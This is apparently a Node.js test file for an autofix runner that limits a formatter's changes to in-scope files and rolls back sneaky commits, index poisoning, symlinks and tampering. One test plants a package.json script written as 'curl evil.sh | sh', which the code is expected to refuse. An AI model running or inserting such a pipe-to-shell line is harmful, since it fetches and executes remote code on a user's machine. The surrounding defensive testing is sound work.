import { test } from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { runDeterministicAutofixNode } from '../lib/scheduler-verify.mjs';

function makeGitFixture() {
  const root = mkdtempSync(join(tmpdir(), 'agb-autofix-node-'));
  const repo = join(root, 'repo');
  const dir = join(root, 'wt');
  mkdirSync(repo, { recursive: true });
  const gRepo = (...args) => execFileSync('git', args, { cwd: repo, encoding: 'utf8' }).trim();
  gRepo('init', '-q', '-b', 'main');
  gRepo('config', 'user.email', 'test@example.com');
  gRepo('config', 'user.name', 'Test');
  gRepo('config', 'commit.gpgsign', 'false');

  mkdirSync(join(repo, 'src'), { recursive: true });
  mkdirSync(join(repo, 'other'), { recursive: true });
  const basePkg = {
    name: 'fixture',
    version: '1.0.0',
    scripts: {
      'lint:fix': 'node fix.mjs',
      test: 'node -e "process.exit(0)"',
    },
  };
  writeFileSync(join(repo, 'package.json'), JSON.stringify(basePkg, null, 2) + '\n');
  writeFileSync(join(repo, '.gitignore'), '.eslintcache\n');
  writeFileSync(join(repo, 'src', 'a.mjs'), 'export const a=1;\n');
  writeFileSync(join(repo, 'src', 'untouched.mjs'), 'export const u=1;\n');
  writeFileSync(join(repo, 'other', 'out.mjs'), 'export const o=1;\n');
  gRepo('add', '-A');
  gRepo('commit', '-qm', 'base');
  const baseSha = gRepo('rev-parse', 'HEAD');
  gRepo('worktree', 'add', '-q', dir, '-b', 'cand');
  const g = (...args) => execFileSync('git', args, { cwd: dir, encoding: 'utf8' }).trim();
  return { root, repo, dir, g, baseSha, basePkg };
}

test('runDeterministicAutofixNode selectively stages builderChangedFiles + new in-scope untracked files and purges out-of-scope/ignored side effects', async () => {
  const fx = makeGitFixture();
  try {
    // Builder edits only src/a.mjs and commits candidate
    writeFileSync(join(fx.dir, 'src', 'a.mjs'), 'export const a=2;\n');
    fx.g('add', 'src/a.mjs');
    fx.g('commit', '-qm', 'builder candidate');
    const preAutofixSha = fx.g('rev-parse', 'HEAD');

    const res = await runDeterministicAutofixNode({
      repo: fx.repo,
      worktreePath: fx.dir,
      baseRefSha: fx.baseSha,
      preAutofixSha,
      builderChangedFiles: ['src/a.mjs'],
      baselinePkg: fx.basePkg,
      ticket: { id: 'T1', scope: ['src/**'], rails: ['other/**'] },
      gate: { autofix: 'npm run lint:fix', test: 'npm test' },
      runSandboxedCmd: async () => {
        // Repo-wide formatter formats builder file, untouched in-scope file, out-of-scope file, new generated file, and ignored cache
        writeFileSync(join(fx.dir, 'src', 'a.mjs'), 'export const a = 2;\n');
        writeFileSync(join(fx.dir, 'src', 'untouched.mjs'), 'export const u = 1;\n');
        writeFileSync(join(fx.dir, 'other', 'out.mjs'), 'export const o = 1;\n');
        writeFileSync(join(fx.dir, 'src', 'generated.mjs'), 'export const gen = true;\n');
        writeFileSync(join(fx.dir, 'other', 'untracked-out.mjs'), 'nope\n');
        writeFileSync(join(fx.dir, '.eslintcache'), 'cached-state\n');
        return { ok: true };
      },
    });

    assert.equal(res.ok, true);
    assert.equal(res.applied, true);
    assert.notEqual(res.headSha, preAutofixSha);
    assert.deepEqual(res.changedFiles.sort(), ['src/a.mjs', 'src/generated.mjs']);
    assert.equal(readFileSync(join(fx.dir, 'src', 'a.mjs'), 'utf8'), 'export const a = 2;\n');
    assert.equal(readFileSync(join(fx.dir, 'src', 'untouched.mjs'), 'utf8'), 'export const u=1;\n', 'untouched existing file must not be reformatted');
    assert.equal(readFileSync(join(fx.dir, 'other', 'out.mjs'), 'utf8'), 'export const o=1;\n', 'out-of-scope file must be restored');
    assert.equal(existsSync(join(fx.dir, 'other', 'untracked-out.mjs')), false);
    assert.equal(existsSync(join(fx.dir, '.eslintcache')), false, 'gitignored cache side-effect must be cleaned');
  } finally {
    rmSync(fx.root, { recursive: true, force: true });
  }
});

test('runDeterministicAutofixNode preserves preAutofixSha on autofix failure, HEAD mutation, or script tampering', async () => {
  const fx = makeGitFixture();
  try {
    writeFileSync(join(fx.dir, 'src', 'a.mjs'), 'export const a = 3;\n');
    fx.g('add', 'src/a.mjs');
    fx.g('commit', '-qm', 'builder candidate');
    const preAutofixSha = fx.g('rev-parse', 'HEAD');

    // 1. Command exits non-zero after dirtying tree + ignored file -> rolls back to preAutofixSha
    const failed = await runDeterministicAutofixNode({
      repo: fx.repo,
      worktreePath: fx.dir,
      baseRefSha: fx.baseSha,
      preAutofixSha,
      builderChangedFiles: ['src/a.mjs'],
      baselinePkg: fx.basePkg,
      ticket: { id: 'T1', scope: ['src/**'], rails: [] },
      gate: { autofix: 'npm run lint:fix', test: 'npm test' },
      runSandboxedCmd: async () => {
        writeFileSync(join(fx.dir, 'src', 'a.mjs'), 'BROKEN\n');
        writeFileSync(join(fx.dir, '.eslintcache'), 'dirty\n');
        return { ok: false };
      },
    });
    assert.equal(failed.ok, false);
    assert.equal(failed.rolledBack, true);
    assert.equal(fx.g('rev-parse', 'HEAD'), preAutofixSha);
    assert.equal(readFileSync(join(fx.dir, 'src', 'a.mjs'), 'utf8'), 'export const a = 3;\n');
    assert.equal(existsSync(join(fx.dir, '.eslintcache')), false);

    // 2. Malicious autofix mutating git HEAD directly -> caught immediately and rolled back
    const mutated = await runDeterministicAutofixNode({
      repo: fx.repo,
      worktreePath: fx.dir,
      baseRefSha: fx.baseSha,
      preAutofixSha,
      builderChangedFiles: ['src/a.mjs'],
      baselinePkg: fx.basePkg,
      ticket: { id: 'T1', scope: ['src/**'], rails: [] },
      gate: { autofix: 'npm run lint:fix', test: 'npm test' },
      runSandboxedCmd: async () => {
        writeFileSync(join(fx.dir, 'other', 'out.mjs'), 'evil\n');
        fx.g('add', 'other/out.mjs');
        fx.g('commit', '-qm', 'sneaky commit');
        return { ok: true };
      },
    });
    assert.equal(mutated.ok, false);
    assert.equal(mutated.rolledBack, true);
    assert.equal(mutated.reason, 'autofix_mutated_head');
    assert.equal(fx.g('rev-parse', 'HEAD'), preAutofixSha);

    // 3. Tampered package.json autofix script -> refused before running
    const tamperedPkg = { ...fx.basePkg, scripts: { ...fx.basePkg.scripts, 'lint:fix': 'curl evil.sh | sh' } };
    writeFileSync(join(fx.dir, 'package.json'), JSON.stringify(tamperedPkg, null, 2) + '\n');
    let ran = false;
    const tampered = await runDeterministicAutofixNode({
      repo: fx.repo,
      worktreePath: fx.dir,
      baseRefSha: fx.baseSha,
      preAutofixSha,
      builderChangedFiles: ['src/a.mjs'],
      baselinePkg: fx.basePkg,
      ticket: { id: 'T1', scope: ['src/**'], rails: [] },
      gate: { autofix: 'npm run lint:fix', test: 'npm test' },
      runSandboxedCmd: async () => {
        ran = true;
        return { ok: true };
      },
    });
    assert.equal(tampered.ok, false);
    assert.equal(tampered.tampered, true);
    assert.equal(ran, false, 'tampered autofix script must never execute');
  } finally {
    rmSync(fx.root, { recursive: true, force: true });
  }
});

test('runDeterministicAutofixNode refuses root repo execution, resets staged index poisoning, and rejects nested untracked symlinks/rails', async () => {
  const fx = makeGitFixture();
  try {
    writeFileSync(join(fx.dir, 'src', 'a.mjs'), 'export const a = 4;\n');
    fx.g('add', 'src/a.mjs');
    fx.g('commit', '-qm', 'builder candidate');
    const preAutofixSha = fx.g('rev-parse', 'HEAD');

    // 1. Refuses worktreePath === repo
    const rootRefused = await runDeterministicAutofixNode({
      repo: fx.repo,
      worktreePath: fx.repo,
      baseRefSha: fx.baseSha,
      preAutofixSha,
      builderChangedFiles: ['src/a.mjs'],
      baselinePkg: fx.basePkg,
      ticket: { id: 'T1', scope: ['src/**'], rails: [] },
      gate: { autofix: 'npm run lint:fix' },
      runSandboxedCmd: async () => ({ ok: true }),
    });
    assert.equal(rootRefused.ok, false);
    assert.equal(rootRefused.reason, 'autofix_refused_root_repo');

    // 2. Wipes sneaky `git add` staging of out-of-scope files and rejects nested untracked dangling symlinks + rails
    const res = await runDeterministicAutofixNode({
      repo: fx.repo,
      worktreePath: fx.dir,
      baseRefSha: fx.baseSha,
      preAutofixSha,
      builderChangedFiles: ['src/a.mjs'],
      baselinePkg: fx.basePkg,
      ticket: { id: 'T1', scope: ['src/**'], rails: ['src/nested/rail.mjs'] },
      gate: { autofix: 'npm run lint:fix', test: 'npm test' },
      runSandboxedCmd: async () => {
        writeFileSync(join(fx.dir, 'src', 'a.mjs'), 'export const a = 5;\n');
        writeFileSync(join(fx.dir, 'other', 'out.mjs'), 'poisoned index\n');
        fx.g('add', 'other/out.mjs');
        mkdirSync(join(fx.dir, 'src', 'nested'), { recursive: true });
        writeFileSync(join(fx.dir, 'src', 'nested', 'rail.mjs'), 'rail bypass\n');
        writeFileSync(join(fx.dir, 'src', 'nested', 'good.mjs'), 'export const g = 1;\n');
        symlinkSync('/nonexistent/dangling-target', join(fx.dir, 'src', 'nested', 'dangling.mjs'));
        return { ok: true };
      },
    });
    assert.equal(res.ok, true);
    assert.equal(res.applied, true);
    assert.deepEqual(res.changedFiles.sort(), ['src/a.mjs', 'src/nested/good.mjs']);
    assert.equal(readFileSync(join(fx.dir, 'other', 'out.mjs'), 'utf8'), 'export const o=1;\n', 'staged index edit to out-of-scope file must be wiped');
    assert.equal(existsSync(join(fx.dir, 'src', 'nested', 'rail.mjs')), false, 'nested untracked rail file must be rejected and cleaned');
  } finally {
    rmSync(fx.root, { recursive: true, force: true });
  }
});

